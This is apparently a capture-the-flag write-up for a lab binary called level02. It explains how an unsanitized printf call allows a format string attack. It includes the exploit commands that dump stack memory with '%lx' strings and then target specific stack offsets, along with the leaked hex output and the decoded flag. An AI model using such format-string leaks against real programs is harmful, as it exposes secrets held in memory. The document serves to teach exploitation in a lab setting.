# level02

Looking at the decompiled code, we can see a glaring unsanitized `printf` call, which we can exploit with a format string vulnerability (cf. rainfall <3)

Our first thought was to use it to write a GOT overwrite for the `exit` function call right after, but we quickly realized that the level flag was read and stored in memory right before it.

We used `printf` format strings to scan the stack memory to see if we could have a sneaky `%s` somewhere and be done, but after this failed, we resorted to printing 64bit values at a time:

```bash
$ echo -n "`python -c 'print "%lx " * 64'`" | ./level02
...
7fffffffe4c0 0 20 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 7fffffffe6b8 1f7ff9a08 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 1006c2520 0 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 does not have access!
```

We knew the bytes of the flag were in there, but converting them from hex didn't lead us to it directly. This is because the hex numbers are in little endian, but reading our string would require big endianness.

We wrote a little script ([`convert.py`](convert.py)) to convert what we were given to a readable string and, after refining the format string to give us exactly the 48 flag bytes we needed, sure enough, we get it:

```
[vm]$ echo -n "%22$lx %23$lx %24$lx %25$lx %26$lx" | ./level02
...
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d does not have access!
[host]$ python3 convert.py <<< '756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d'
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

